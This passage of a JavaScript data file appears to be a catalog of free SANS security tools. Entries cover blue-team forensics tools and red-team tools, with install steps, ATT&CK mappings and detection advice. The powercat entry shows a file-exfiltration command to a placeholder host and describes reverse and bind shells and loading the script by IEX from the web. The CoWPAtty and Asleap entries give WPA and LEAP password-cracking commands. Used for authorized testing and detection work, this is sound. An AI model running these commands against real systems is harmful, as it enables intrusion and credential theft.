...
/* ---------- TOOLS — SANS FREE / OPEN-SOURCE TOOLS (sans.org/tools) ---------- */
{id:"tool-sift-workstation", updated:"2026-07", cat:"Tools", title:"SIFT Workstation", team:"blue",
 desc:"Free Ubuntu-based DFIR distribution from SANS — a ready-made forensics lab preloaded with hundreds of open-source tools (Sleuth Kit, Volatility, Plaso/log2timeline, the EZ tools, and more). The standard analyst workstation for FOR500/FOR508.",
 url:"https://www.sans.org/tools/sift-workstation/", license:"open source (mixed)",
 platforms:["linux"], tags:["forensics","tools","triage","linux","incident-response"],
 requires:{os:"Ubuntu 20.04/22.04 or the prebuilt VM"},
 related:["tool-remnux","tool-sof-elk","for-ez-workflow"],
 steps:[
  {"title":"Easiest: download the VM appliance","cmd":"# grab the prebuilt OVA from https://www.sans.org/tools/sift-workstation/ and import into VMware/VirtualBox","note":"The appliance boots straight into a fully provisioned analyst desktop — nothing else to install."},
  {"title":"Or install onto your own Ubuntu","cmd":"sudo sift install","note":"Uses the sift-cli (github.com/teamdfir/sift-cli — download the release binary first). Provisions every tool onto an existing Ubuntu box; takes a while on first run."},
  {"title":"Update the toolset later","cmd":"sudo sift upgrade","optional":true,"note":"Pulls newer tool versions into an existing SIFT install."}],
 install:{linux:`# download the sift-cli release from github.com/teamdfir/sift-cli/releases, then:
sudo sift install`}},

{id:"tool-remnux", updated:"2026-07", cat:"Tools", title:"REMnux", team:"blue",
 desc:"Free Linux toolkit for reverse-engineering and analyzing malicious software — statically and dynamically inspect suspicious executables, documents, scripts, and network captures with a curated set of malware-analysis tools already installed.",
 url:"https://remnux.org/", license:"open source (mixed)",
 platforms:["linux"], tags:["forensics","tools","linux","reference"],
 requires:{os:"Ubuntu 20.04+ or the prebuilt VM"},
 related:["tool-sift-workstation","tool-ez-bstrings"],
 steps:[
  {"title":"Easiest: download the VM appliance","cmd":"# grab the OVA from https://docs.remnux.org and import into your hypervisor","note":"Boots into a ready malware-analysis desktop with everything preloaded."},
  {"title":"Or add REMnux to an existing Ubuntu","cmd":"curl -sSL https://raw.githubusercontent.com/REMnux/distro/master/files/remnux-installer.sh | sudo bash","note":"The current installer uses Cast to provision the toolset. Read the script first, as with any piped installer. Full docs at docs.remnux.org."}],
 install:{linux:`curl -sSL https://raw.githubusercontent.com/REMnux/distro/master/files/remnux-installer.sh | sudo bash
# review the script before running — see docs.remnux.org for the VM option`}},

{id:"tool-sof-elk", updated:"2026-07", cat:"Tools", title:"SOF-ELK", team:"blue",
 desc:"Free big-data analytics VM built on the Elastic Stack, tuned for forensic and IR analysts. Drop parsed logs, NetFlow, or timeline CSVs into a directory and get pre-built Kibana dashboards over them — no ELK tuning required. Maintained by Phil Hagen.",
 url:"https://www.sans.org/tools/sof-elk/", license:"open source (GPL)",
 platforms:["linux"], tags:["forensics","tools","logs","detection","incident-response"],
 requires:{os:"prebuilt VM (VMware) or Ubuntu"},
 related:["tool-sift-workstation","for-ez-evtx","for-ez-workflow"],
 steps:[
  {"title":"Download the VM appliance","cmd":"# get the SOF-ELK VM (link on https://www.sans.org/tools/sof-elk/) and import it","note":"The appliance is the supported way to run it; comes with the dashboards and ingest pipelines configured."},
  {"title":"Load evidence by dropping files","cmd":"cp timeline.csv /logstash/plaso/   # or /logstash/nfarch/, /logstash/httpd/, ...","note":"SOF-ELK watches labeled ingest directories. Copy Plaso timelines, NetFlow, or web logs into the matching folder and they appear in Kibana automatically."},
  {"title":"Clone the repo for the config / offline use","cmd":"git clone https://github.com/philhagen/sof-elk","optional":true,"note":"The GitHub repo holds the parsers and dashboards if you want to run the stack yourself or inspect the pipelines."}],
 install:{linux:`git clone https://github.com/philhagen/sof-elk
# production use: download the prebuilt VM from https://www.sans.org/tools/sof-elk/`}},

{id:"tool-deepbluecli", updated:"2026-07", cat:"Tools", title:"DeepBlueCLI", team:"blue",
 desc:"PowerShell threat-hunting module that reads Windows event logs and surfaces attacker behavior — suspicious command lines, password spraying, new users/services, PowerShell abuse, obfuscation, and log clearing — from a live box or a saved .evtx. From the SANS Blue Team.",
 url:"https://www.sans.org/tools/deepbluecli/", license:"open source (GPL-3.0)",
 platforms:["windows"], tags:["forensics","detection","logs","incident-response","windows"],
 requires:{os:"Windows", tool:"PowerShell 5+"},
 related:["for-ez-evtx","for-logons","for-failed-logons"],
 steps:[
  {"title":"Get it","cmd":"git clone https://github.com/sans-blue-team/DeepBlueCLI","note":"Pure PowerShell — no build step. You may need Set-ExecutionPolicy Bypass -Scope Process to run the script."},
  {"title":"Hunt a live log","cmd":".\\DeepBlue.ps1 -log Security","note":"Reads the local Security log and prints only the events its detections flag, with a plain-English reason. Swap in System, Application, or the PowerShell/Sysmon operational logs."},
  {"title":"Hunt a saved evtx","cmd":".\\DeepBlue.ps1 .\\evtx\\{{EVTX:new-user-security.evtx}}","note":"Point it at an exported .evtx pulled from another host — ideal for offline triage of collected logs."},
  {"title":"See what it detects","cmd":".\\DeepBlue.ps1 .\\evtx\\psattack-security.evtx","optional":true,"note":"The repo ships sample .evtx files demonstrating each detection (password spray, obfuscated PowerShell, Mimikatz, etc.) — a good way to learn what to look for."}],
 install:{cmd:`git clone https://github.com/sans-blue-team/DeepBlueCLI`}},

{id:"tool-chaps", updated:"2026-07", cat:"Tools", title:"CHAPS", team:"blue",
 desc:"Configuration Hardening Assessment PowerShell Script — checks a Windows host's security settings (PowerShell logging, SMB signing, LSA protection, UAC, Defender, and more) on systems where you can't run a full benchmark tool. Reports gaps as an offline HTML/text report.",
 url:"https://www.sans.org/tools/chaps/", license:"open source (GPL-3.0)",
 platforms:["windows"], tags:["detection","windows","tools","reference"],
 requires:{os:"Windows", tool:"PowerShell 5+"},
 related:["tool-deepbluecli","sec-defender-scan"],
 steps:[
  {"title":"Get it","cmd":"git clone https://github.com/cutaway-security/chaps","note":"Designed to run from a USB stick on a standalone or air-gapped system with no internet and no installed audit tooling."},
  {"title":"Run the assessment","cmd":"powershell -ExecutionPolicy Bypass -File .\\chaps.ps1","note":"Writes a timestamped report of pass/fail hardening checks to the output folder. Review the failures against your baseline."}],
 install:{cmd:`git clone https://github.com/cutaway-security/chaps`}},

{id:"tool-domain-stats", updated:"2026-07", cat:"Tools", title:"Domain Stats", team:"blue",
 desc:"SIEM-integration service (Mark Baggett) that flags the first time your network ever contacts a DNS domain, and how recently that domain was registered — a cheap, high-signal way to catch newly registered malware and phishing infrastructure.",
 url:"https://www.sans.org/tools/domain-stats/", license:"open source (MIT)",
 platforms:["windows","macos","linux"], tags:["detection","dns","network","tools"],
 requires:{tool:"Python 3"},
 related:["for-dns-cache","tool-deepbluecli"],
 steps:[
  {"title":"Get it","cmd":"git clone https://github.com/MarkBaggett/domain_stats","note":"Runs as a small local web service your SIEM queries per domain."},
  {"title":"Install and start the service","cmd":"pip install -r requirements.txt && python domain_stats.py {{PORT:8000}}","note":"Once running, your SIEM enriches DNS logs by asking it about each domain: is this the first time we've seen it, and how old is its registration?"}],
 install:{cmd:`git clone https://github.com/MarkBaggett/domain_stats && cd domain_stats && pip install -r requirements.txt`,
  linux:`git clone https://github.com/MarkBaggett/domain_stats && cd domain_stats && pip3 install -r requirements.txt`}},

{id:"tool-apollo", updated:"2026-07", cat:"Tools", title:"APOLLO (Apple Pattern of Life)", team:"blue",
 desc:"Apple Pattern of Life Lazy Output'er (Sarah Edwards) — extracts and correlates activity from dozens of iOS/macOS SQLite databases (knowledgeC, powerlog, biome, and more) into a single timeline of what the user and device were doing, second by second.",
 url:"https://www.sans.org/tools/apollo/", license:"open source",
 platforms:["macos","linux","windows"], tags:["forensics","timeline","macos","triage"],
 requires:{tool:"Python 3"},
 related:["for-ez-workflow","tool-ez-sqlecmd"],
 steps:[
  {"title":"Get it","cmd":"git clone https://github.com/mac4n6/APOLLO","note":"Ships with a large library of community “modules” — one per known iOS/macOS artifact database."},
  {"title":"Parse an extraction into one timeline","cmd":"python apollo.py -o csv -p ios {{EXTRACT:/path/to/filesystem_extraction}}","note":"Point it at a mounted iOS/macOS filesystem extraction; it runs every matching module and writes a combined, sortable pattern-of-life CSV. Open the result in Timeline Explorer."}],
 install:{cmd:`git clone https://github.com/mac4n6/APOLLO`}},

{id:"tool-srum-dump", updated:"2026-07", cat:"Tools", title:"SRUM-DUMP", team:"blue",
 desc:"Windows GUI forensics tool (Mark Baggett) that turns the SRUM database into a formatted Excel workbook — per-application network usage, run time, and energy data — using a template so the columns are labeled and readable. A friendlier alternative to the CLI SRUM parsers.",
 url:"https://www.sans.org/tools/srum-dump/", license:"open source",
 platforms:["windows"], tags:["forensics","network","triage","windows"],
 requires:{os:"Windows", tool:"Python 3 (or the packaged EXE)"},
 related:["for-ez-srum","tool-ez-srumecmd"],
 steps:[
  {"title":"Get it","cmd":"git clone https://github.com/MarkBaggett/srum-dump","note":"A prebuilt EXE is also published on the releases page if you don't want a Python environment."},
  {"title":"Run it against SRUDB.dat","cmd":"python srum_dump.py -i {{SRUM:SRUDB.dat}} -t {{TEMPLATE:SRUM_TEMPLATE.xlsx}} -o {{OUT:srum.xlsx}}","note":"Provide the SRUDB.dat (from C:\\Windows\\System32\\sru\\), the bundled template, and an output path. Start with the network-usage sheet to spot the app that moved gigabytes."}],
 install:{cmd:`git clone https://github.com/MarkBaggett/srum-dump`}},

{id:"tool-kubesec", updated:"2026-07", cat:"Tools", title:"kubesec", team:"blue",
 desc:"Security risk analysis for Kubernetes manifests — scores a Pod/Deployment YAML against a set of hardening rules (privileged containers, host mounts, dropped capabilities, read-only root FS) and tells you exactly what to fix. Runs as a CLI, web service, or admission controller.",
 url:"https://www.sans.org/tools/kubesec/", license:"open source (Apache-2.0)",
 platforms:["windows","macos","linux"], tags:["containers","cloud","detection","tools"],
 related:["tool-purplecloud"],
 steps:[
  {"title":"Scan a manifest with the container image","cmd":"docker run -i kubesec/kubesec:latest scan /dev/stdin < {{MANIFEST:pod.yaml}}","note":"No install needed — pipe any Pod/Deployment YAML in and get a JSON score with pass/advise items and the exact fixes."},
  {"title":"Or install the binary and scan","cmd":"kubesec scan {{MANIFEST:deployment.yaml}}","note":"Same output from a downloaded release binary. Exit code is non-zero when the score falls below threshold, so it drops straight into CI."},
  {"title":"Run it as a local service","cmd":"docker run -p 8080:8080 kubesec/kubesec:latest http 8080","optional":true,"note":"Exposes an HTTP endpoint so pipelines and admission webhooks can POST manifests for scoring."}],
 install:{cmd:`docker pull kubesec/kubesec:latest`,
  mac:`brew install kubesec`,
  linux:`# download the release binary from github.com/controlplaneio/kubesec/releases, or:
docker pull kubesec/kubesec:latest`}},

{id:"tool-purplecloud", updated:"2026-07", cat:"Tools", title:"PurpleCloud", team:"purple",
 desc:"Infrastructure-as-code (Jason Ostrom) that stands up a small Active Directory range in Azure with Terraform + Ansible — a disposable, self-contained lab for practicing attacks and building detections without touching production. Tear it down when you're done.",
 url:"https://www.sans.org/tools/purplecloud/", license:"open source (GPL-3.0)",
 platforms:["windows","macos","linux"], tags:["cloud","active-directory","tools","teaching"],
 attack:["T1583.001"], detect:"This is a lab-builder, not an attack tool; detection applies to what you practice inside the range, not to running PurpleCloud itself. Use it to generate the telemetry you then write detections against.",
 danger:"Deploys billable Azure resources under your subscription. Destroy the range (terraform destroy) when finished to avoid ongoing charges.",
 requires:{tool:"Terraform, Ansible, Azure CLI + subscription"},
 related:["tool-kubesec","ad-userfind"],
 steps:[
  {"title":"Get it","cmd":"git clone https://github.com/iknowjason/PurpleCloud","note":"Requires an Azure subscription and the Azure CLI logged in (az login)."},
  {"title":"Build the range","cmd":"terraform init && terraform apply","note":"Provisions a domain controller and workstations wired into a working AD domain. Read the module's variables first to size and scope it."},
  {"title":"Tear it down","cmd":"terraform destroy","note":"Always destroy when finished — the resources bill continuously while they exist."}],
 install:{cmd:`git clone https://github.com/iknowjason/PurpleCloud`}},

{id:"tool-c2-matrix", updated:"2026-07", cat:"Tools", title:"The C2 Matrix", team:"purple",
 desc:"A curated, side-by-side comparison of command-and-control frameworks (Cobalt Strike, Mythic, Sliver, Havoc, and dozens more) across features like protocols, agents, and evasion — the reference for choosing a C2 for red/purple engagements, and for knowing what defenders should hunt for.",
 url:"https://www.thec2matrix.com/", license:"free (reference)",
 platforms:["windows","macos","linux"], tags:["tools","reference","post-ex"],
 attack:["T1071"], detect:"Use the matrix to enumerate each framework's default C2 channels and profiles, then build detections for them: beacon jitter/interval patterns, default JA3/TLS fingerprints, named-pipe and HTTP URI conventions, and known malleable-profile artifacts.",
 danger:"Reference only, but it catalogs offensive C2 frameworks — deploy any of them solely against systems you are authorized to test.",
 related:["tool-purplecloud"],
 steps:[
  {"title":"Browse the comparison","cmd":"# open https://www.thec2matrix.com/matrix — filter frameworks by the features you need","note":"Each row is a C2 framework; columns cover protocols, agent languages, licensing, and capabilities. There's a companion questionnaire (c2selection) to narrow the field."}],
 install:{cmd:`:: web reference — no install; visit https://www.thec2matrix.com/`}},

{id:"tool-powercat", updated:"2026-07", cat:"Tools", title:"powercat", team:"red",
 desc:"A PowerShell implementation of netcat — connect, listen, relay, and transfer files or shells over TCP/UDP using only built-in PowerShell, no netcat binary required. Common on engagements for a quick reverse/bind shell or a file pull on Windows.",
 url:"https://www.sans.org/tools/powercat/", license:"open source (BSD-3-Clause)",
 platforms:["windows"], tags:["network","post-ex","remote","windows","tools"],
 attack:["T1059.001","T1105"], detect:"Alert on PowerShell processes opening raw network sockets (System.Net.Sockets.TcpClient) — visible in Script Block Logging (Event 4104) and Sysmon Event 3 where the initiating image is powershell.exe. powercat's function names appear verbatim in block logs when not obfuscated.",
 danger:"Offensive/dual-use. Only run against systems you are authorized to test.",
 requires:{os:"Windows", tool:"PowerShell"},
 related:["tool-deepbluecli"],
 steps:[
  {"title":"Load the function","cmd":". .\\powercat.ps1","note":"Dot-source the script (or IEX it from a web host) to bring the powercat function into the session."},
  {"title":"Listen on a port","cmd":"powercat -l -p {{PORT:443}} -v","note":"-l listens; pair with -e cmd.exe for a bind shell or -of to write received data to a file. -v is verbose."},
  {"title":"Connect out (client)","cmd":"powercat -c {{HOST:10.0.0.1}} -p {{PORT:443}} -i C:\\loot.zip","note":"-c connects to a listener; -i sends a file, -e runs a program for a reverse shell. Great for exfil tests and shell handling in a controlled lab."}],
 install:{cmd:`git clone https://github.com/besimorhino/powercat`}},

{id:"tool-cowpatty", updated:"2026-07", cat:"Tools", title:"CoWPAtty", team:"red",
 desc:"Offline dictionary attack against WPA/WPA2-PSK (Joshua Wright) — given a captured 4-way handshake and the network's SSID, it tests a wordlist to recover the pre-shared key. Supports precomputed PMK hash tables for much faster cracking.",
 url:"https://www.sans.org/tools/cowpatty/", license:"open source (GPL)",
 platforms:["linux"], tags:["wireless","password","tools"],
 attack:["T1110.002"], detect:"The crack itself is entirely offline and invisible on the wire; defend by requiring a long, random PSK (or moving to 802.1X/WPA3), since dictionary attacks only succeed against guessable passphrases. Monitor for the deauth floods often used to capture the handshake first.",
 danger:"Offensive/dual-use. Only test wireless networks you own or are authorized to assess.",
 requires:{os:"Linux", tool:"libpcap"},
 related:["tool-asleap"],
 steps:[
  {"title":"Get it","cmd":"git clone https://github.com/joswr1ght/cowpatty && cd cowpatty && make","note":"Small C tool; needs libpcap headers to build."},
  {"title":"Run a dictionary attack","cmd":"cowpatty -r {{CAP:handshake.cap}} -f {{WORDLIST:wordlist.txt}} -s {{SSID:CorpWiFi}}","note":"-r is the capture with the 4-way handshake, -f the wordlist, -s the exact SSID (the SSID is salted into the PMK, so it must match)."},
  {"title":"Speed it up with a hash table","cmd":"genpmk -f {{WORDLIST:wordlist.txt}} -d {{TABLE:pmk-corpwifi}} -s {{SSID:CorpWiFi}} && cowpatty -r {{CAP:handshake.cap}} -d {{TABLE:pmk-corpwifi}} -s {{SSID:CorpWiFi}}","optional":true,"note":"genpmk precomputes the per-SSID PMKs once; reusing the table makes subsequent cracks against that SSID dramatically faster."}],
 install:{linux:`git clone https://github.com/joswr1ght/cowpatty && cd cowpatty && make`}},

{id:"tool-asleap", updated:"2026-07", cat:"Tools", title:"Asleap", team:"red",
 desc:"Recovers weak passwords from captured Cisco LEAP and generic MS-CHAPv2 exchanges (Joshua Wright) — dictionary-attacks the challenge/response to reveal the credential. Classic demonstration of why LEAP and MS-CHAPv2 are unsafe.",
 url:"https://www.sans.org/tools/asleap/", license:"open source (GPL)",
 platforms:["linux"], tags:["wireless","password","tools"],
 attack:["T1110.002"], detect:"Attack is offline against captured frames; defend by retiring LEAP/MS-CHAPv2 in favor of EAP-TLS, and by enforcing strong credentials. Capture of the exchange typically follows a forced reauthentication/deauth — watch for those on the WLAN.",
 danger:"Offensive/dual-use. Only test networks and systems you are authorized to assess.",
 requires:{os:"Linux", tool:"libpcap"},
 related:["tool-cowpatty"],
 steps:[
  {"title":"Get it","cmd":"git clone https://github.com/joswr1ght/asleap && cd asleap && make","note":"C tool; requires libpcap and openssl headers."},
  {"title":"Crack from a capture","cmd":"asleap -r {{PCAP:leap.pcap}} -f {{DICT:dict.dat}} -n {{INDEX:index.idx}}","note":"-r reads the capture and pulls the challenge/response; -f/-n point at a genkeys-built dictionary/index for fast lookups."}],
 install:{linux:`git clone https://github.com/joswr1ght/asleap && cd asleap && make`}},

{id:"tool-killerbee", updated:"2026-07", cat:"Tools", title:"KillerBee",
 desc:"Framework and tool suite for testing ZigBee and IEEE 802.15.4 networks (Joshua Wright) — sniff, inject, replay, and decode low-rate wireless traffic used by IoT, smart-home, and some ICS devices. Needs compatible RF capture hardware (e.g. RZUSBstick, ApiMote).",
 url:"https://www.sans.org/tools/killerbee/", license:"open source (dual BSD/GPL)",
 platforms:["linux"], tags:["wireless","tools","reference"],
 danger:"Offensive/dual-use, and requires specialized 802.15.4 radio hardware. Only test networks you are authorized to assess.",
 requires:{os:"Linux", tool:"Python + RZUSBstick/ApiMote hardware"},
 related:["tool-cowpatty","tool-asleap"],
 steps:[
  {"title":"Get it","cmd":"git clone https://github.com/riverloopsec/killerbee && cd killerbee && sudo python setup.py install","note":"Installs the library plus the zb* command-line tools. Needs a supported 802.15.4 capture device attached."},
  {"title":"Find your interface, then capture","cmd":"zbid   # list attached KillerBee devices\nzbdump -c {{CHANNEL:15}} -w {{OUT:zigbee.pcap}}","note":"zbid enumerates radios; zbdump captures 802.15.4 traffic on a channel to a pcap you can open in Wireshark. Other tools (zbreplay, zbstumbler, zbwireshark) cover replay and discovery."}],
 install:{linux:`git clone https://github.com/riverloopsec/killerbee && cd killerbee && sudo python setup.py install`}},
